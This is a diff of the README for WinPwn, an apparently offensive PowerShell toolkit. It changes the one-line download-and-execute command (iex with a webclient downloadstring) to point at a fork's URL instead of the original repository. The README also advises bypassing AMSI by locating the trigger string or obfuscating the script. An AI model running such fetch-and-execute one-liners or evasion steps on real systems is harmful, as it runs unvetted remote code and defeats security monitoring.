@@ -9,7 +9,7 @@ Any suggestions, feedback, Pull requests and comments are welcome!
 Just Import the Modules with:
 
 `Import-Module .\WinPwn.ps1` or 
-`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`
+`iex(new-object net.webclient).downloadstring('https://github.com/sp00ks-git/WinPwn/raw/master/WinPwn.ps1')`
 
 To bypass AMSI take one of the existing [bypass techniques](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), find the AMSI [trigger](https://github.com/RythmStick/AMSITrigger) and manually change it in the bypass function or encode the trigger string. Alternatively obfuscate the whole script. 
 
